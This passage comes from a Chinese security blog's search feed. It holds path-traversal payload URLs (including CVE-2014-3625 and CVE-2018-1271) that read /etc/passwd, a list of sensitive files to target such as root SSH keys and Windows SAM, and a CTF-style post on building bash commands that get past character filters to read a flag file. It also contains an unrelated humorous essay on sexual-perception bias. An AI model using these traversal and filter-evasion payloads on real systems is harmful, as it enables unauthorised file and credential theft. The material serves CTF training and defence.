class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h2 id="路径遍历检测"><a href="#路径遍历检测" class="headerlink" title="路径遍历检测"></a>路径遍历检测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(文件标识符)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">在httpd.conf文件中找到   Options +Indexes +FollowSymLinks +ExecCGI  并修改成   Options -Indexes+FollowSymLinks +ExecCGI  并保存</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">修改conf&#x2F;web.xml，将true 改为false 重启tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1、在服务器端，打开 控制面板 --&gt;管理工具--&gt; IIS管理器</span><br><span class="line">2、右击默认网站 --&gt; 属性--&gt; 主目录 --&gt;取消“目录浏览”复选框</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小谈性知觉偏差导致蜜汁自信</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>人生三大错觉：📱振动、👴能反杀（👴确实可以反杀，确实可以啊！）、她喜欢👴</p><p>”Ta喜欢👴为甚么还不承认“，或许可以用性知觉偏差来解释。</p><p>虽然按理来说”Ta明明暗恋我，就是不肯勇敢承认自己的感情“这种错觉是不分男女的，但是一般来说基本上是男性占比多，对于一个普通的、正常的、友好的表示，男性普遍性地容易误解为爱情，在两性中虽然都会有认知不正确的时候，但是男性更容易产生这种Ta喜欢我的夸大型性知觉偏差。</p><hr><p>心理学家做过的研究：</p><p>​    找一些男女大学生来观看某个录像，录像内容是一个教授和一个女学生谈话，女学生想要论文延期，教授和女学生交流得比较友好，嗷，两个演技很精湛的演员也注意了仅仅只是表现友好，不要表现得轻浮和挑逗。</p><p>结果：</p><p>​    女生们：录像中只看到女孩子的友好，关于性感、性诱惑这类的没看出来，而男生们则纷纷表示看出来这个女孩子明显有性方面的展现和诱惑。</p><p>另外的一个研究：</p><p>​    看的是两个男女同学互相在学习的照片，然后图片中的女孩子对这个男的有没有意思。</p><p>结果：</p><p>​    大部分女生看到（觉得）没有啊，两个人很正常啊，但男生一看不对，这个女孩子对这个男孩子有意思，有意思，肯定有意思哈，男生们普遍认为照片中的女孩子心不在焉，心不在学习，表现出了很明显的性感和对男孩子的诱惑。</p><hr><p>这些偏差也并不只适用于普信男（普通而又自信），也适用于一些具有较高配偶价值的人，就比如男领导，事业有成型男人更容易产生这种错觉，欸，👴的女下属这些人对👴有意思奥，所以一些工作场景中的性骚扰问题也源于此 。</p><p>女性明明只是一种友好的表示，但对方却往往可以误解为她是对我心有所属，更有意思的是，当男性遇到漂亮的性感的女性的时候更容易产生这种偏差，主要想一想，人家漂亮的妹子择偶标准都已经够高了，为甚么就这么那啥而不知呢。</p><p>其原因就在于漫长的人类进化过程中，我们知道，两性从进化的根源上来讲，Ta们的性选择、择偶策略是不同的，女性由于孩子的抚养等问题需要一个稳定有资源的男士，所以女性在择偶中都是很慎重的，而男性则不然，Ta在整个生殖过程所负担的并不是那么多，所以男性会追求更多的异性，在更多的两性欢愉之中才能提升自己基因传递下去的比率。</p><p>对于男性而言，Ta对女性的情感认知容易犯两方面错误，一是对方对👴没意思，而👴觉得对方有意思，这是一种误报，另外是对方对👴有意思，而👴判断Ta没意思，这是一种漏报，两种错误权衡下来，男性做出的选择是：宁可误报，不可漏报，宁可错杀一千，不能放过一个。</p><p>进化的动力让男性把任何的女性的好感都解释为性方面的兴趣，所以有了典型的微笑当爱情这种搞法，说白了，这一类的男性呢，就是用下半身思考的动物。</p><p>不过最后还是说一句，并不是所有的男性都是这个样子，本文也只是图一乐，开开玩笑，调侃几句。</p><p>差不多得了，溜之。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些shell的骚操作</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h1><p>很久之前无意间发现 <code>$(())</code> 这个好玩的玩意儿，有过一波深♂入</p><table><thead><tr><th>数字</th><th>构造</th></tr></thead><tbody><tr><td>-1</td><td>$((~$(())))</td></tr><tr><td>0</td><td>$(())</td></tr><tr><td>0</td><td>$#</td></tr><tr><td>1</td><td>$((<del>$(($((</del>$(())))$((~$(())))))))</td></tr><tr><td>1</td><td>$                                                        || 2    | $((~$(($((~$(())))$((~$(())))$((~$(())))))))                 || 2    | $(($&lt;&lt;$))                                            || 3    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))      || 3    | $(($(($&lt;&lt;$))#$$))                            || 4    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) || 4    | $(($&lt;&lt;$(($<<$))))</td></tr><tr><td>5</td><td>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(())))))))</td></tr><tr><td>5</td><td>$(($(($<<$))#$$(())$))</td></tr><tr><td>6</td><td>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</td></tr><tr><td>6</td><td>$(($(($<<$))#$$$(())))</td></tr><tr><td>7</td><td>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(())))))))</td></tr><tr><td>7</td><td>$(($(($<<$))#$$$))                       || 8    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) || 8    | ${LANG:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))}        || 9    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) |有一个很特殊的：`$}</td></tr><tr><td>.</td><td>${LANG:$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((~$(()))))))):1}</td></tr><tr><td>/bin/cat</td><td>${SHELL::$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))))))}${PATH:$((</del>$(($((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(()))))))):2}${HOME:$((~$(()))):$}</td></tr></tbody></table><p>待补充……</p><h2 id="利用-以及数字构造任意数"><a href="#利用-以及数字构造任意数" class="headerlink" title="利用 $ ( ) # 以及数字构造任意数"></a>利用 $ ( ) # 以及数字构造任意数</h2><p><code>$((2#1000001)) = 53</code></p><p>形式: <code>$((2#&#123;二进制&#125;))) = &#123;八进制&#125;</code></p><h2 id="利用-构造任意数"><a href="#利用-构造任意数" class="headerlink" title="利用 $ ( ) ~ 构造任意数"></a>利用 $ ( ) ~ 构造任意数</h2><p>以 <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> 为例子吧：</p><h3 id="含有任何负数的情况"><a href="#含有任何负数的情况" class="headerlink" title="含有任何负数的情况"></a>含有任何负数的情况</h3><p>只要有任意 <code>$(($n))</code> 为负数，则表达式的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是正数，则拼接到前一位的末尾</span><br><span class="line">如果是负数，则与前面分开</span><br></pre></td></tr></table></figure><p>比如：<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> 的情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>或者：<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>亦或者：<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h3 id="a-为-0-的情况"><a href="#a-为-0-的情况" class="headerlink" title="$(($a)) 为 0 的情况"></a>$(($a)) 为 0 的情况</h3><p>当 <code>$(($a))</code> 为 0，且其它都为非负数时，整个表达式的结果最后为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 ······</span></span><br><span class="line">即从最后的 $(($n)) 开始，往前推，直到第一位</span><br></pre></td></tr></table></figure><h3 id="全部为正数的情况"><a href="#全部为正数的情况" class="headerlink" title="全部为正数的情况"></a>全部为正数的情况</h3><p>如果所有的 <code>$(($n))</code> 都为正数，则全部拼接在一起输出……</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前不久想折磨一下大一新生，特意去研究了一下</p><p>现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>我们首先看一下，没有小写字母，直接执行命令是不可能的，然后只能想到利用 <code>/bin/cat</code> 这一类的来尝试一下，但是 / 也被过滤了，这个时候我们就要思考一下 / 从哪里来了</p><p>给了大写字母和 $ { } 可以尝试一下利用环境变量，env 这个指令可以获取环境变量，不同人的机子不一样，环境变量也不一样，可能会有所出入，但是我的是 ok 的，所以相信大家的都 ok</p><p>因为 <code>PATH</code> 是 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>，所以我们可以尝试取它的第一位，就可以获得 / 了，然后又有 <code>SHELL</code> 为 <code>/bin/bash</code>，所以我们也可以尝试取它的前五位，就是 <code>/bin/</code>，然后就只要考虑后面用哪个命令读取了，但是问题就来了，题目并没有给👴数字，那👴怎么办呢，很简单</p><hr><p>shell 中运行的每个命令都使用退出状态码（exit status）来告诉shell 它完成了处理。退出状态码是一个 0 ~ 255 之间的整数值，在命令结束运行时由命令传给shell</p><p>Linux 使用了 $? 这个专属变量来保存上个执行的命令的退出状态码</p><hr><p>所以我们可以利用 $?  来榨取一个数字，但是我们可以榨取到哪个数字呢，又是否对我们的操作有帮助呢</p><p>Linux 的错误状态退出状态码没有什么标准可遵循，但有一些参考</p><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>命令成功结束</td></tr><tr><td>1</td><td>一般性未知错误</td></tr><tr><td>2</td><td>不适合的 shell 命令</td></tr><tr><td>123</td><td>命令不可执行</td></tr><tr><td>127</td><td>没找到命令</td></tr><tr><td>128</td><td>无效退出参数</td></tr><tr><td>128+x</td><td>与 Linux 信号x相关的严重错误</td></tr><tr><td>130</td><td>通过 ctrl+c 终止的命令</td></tr><tr><td>255</td><td>正常范围之内的退出状态码</td></tr></tbody></table><p>emm，”一般性未知错误“</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>彳亍，那我们就有一个 1 了，不过 2 啥的还没找到咋搞，不过有一个 1 就够了，因为我们还有一个 <code>RANDOM</code> 环境变量可以利用：<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>，介个样子就可以取到一位随机数了，很玄学的一个地方就是 <code>~A</code> 这个玩意儿似乎在 <code>$&#123;&#125;</code> 可以取到环境变量的最后一位的位置，利用这个点可以玩很多骚的</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>好了，随机个位数字也来了，我们只需要这样：<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>，随机到一个 5 就可以获得 <code>/bin/</code> 辣，那么怎么读文件呢，看了蛮久的 env 后发现，似乎用 tac 是最好的选择，因为最后一位的 t 蛮多的，比如 HOME，USER，MAIL（我的反正是）</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>然后空格用 $IFS 随便过了，最后文件马马虎虎一个 <code>$&#123;PATH::$?&#125;????.???</code> 代替了 /flag.txt，最终 payload：<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>你别说，我还真读出来了奥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>但是很奇怪的一点，就是 <code>/bin/t?? flag.txt</code> 的时候会出现前上图一大串奇怪的乱码，但是直接 <code>/bin/tac flag.txt</code> 不会</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>这一点不咋理解，但是无伤大雅</p><p>最后再来一个，我把 &lt; 或者 $? 过滤（就是这俩货连在一起就过滤）的话应该怎么办？</p><p>很简单，用 <code>SHIVL</code> 就 ok 了，SHIVL=1</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>这会想继续折磨一下大一新生，结合了一下前面的构造数字，应该挺简单的，不秒掉的话就要打PP</p><p>ok，现在抛出一个问题：现在👴试图读出 /FLAG.TXT 文件，但是👴被限制了字符，只允许使用如下字符，同时禁止出现形如 <code>~A</code> 的字符串，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) ~</span><br><span class="line">A D E F G H I L M N O P R T S U X</span><br></pre></td></tr></table></figure><p><del>先不写了，👴也还没仔细想，只是觉得这样可以出，这周末课设，太烦了，睡了</del></p><p>很简单：利用👴前面列出来的表格就 ok 了，此处便不做详解，直接给出 payload：（/bin/cat FLAG.TXT）<code>$&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;HOME:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;$IFS$9FLAG$&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))))))&#125;TXT</code></p><p><img src="https://i.loli.net/2021/05/03/TIgDzNHnW5V9QBm.png"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>越提折磨👴越兴奋，来一波新的简单思路</p><p>现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#123; &#125; : 0-9 ? &#x2F; .</span><br></pre></td></tr></table></figure><p>太简单了太简单了，直接给出 payload 吧，都不需要分析的：（/bin/less flag.txt）</p><p><code>/$&#123;0:1:1&#125;??/??$&#123;0:3:1&#125;$&#123;0:3:1&#125; ????.???</code></p><p>because $0 返回 <code>-bash</code>（这个好像确实有不同，@LemonPrefect 师傅的和我的就有区别，他的 $0 是返回 bash，可能是因为👴的bash版本太旧了（），当然，只是一个 - 的区别，本质还是没有影响的</p><hr><p><img src="https://i.loli.net/2021/05/03/K9Nk4YmxFnvGLlI.png"></p><p>可以看到我的 bash 版本是 4.26.46(1)，@LemonPrefect 师傅用的最老的 4.26.46(2) 测试也是返回 <code>bash</code>，而非 <code>-bash</code>，此处感谢 @LemonPrefect 师傅帮忙测试</p><hr><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>关于前面这么多骚东西，补充一些基本原理和注意事项吧。</p><p>首先说说为什么 $# 会返回 0 吧，我不知道</p><p>算了，懒起来了，先不搞了，过段时间再整理吧。（别打👴</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
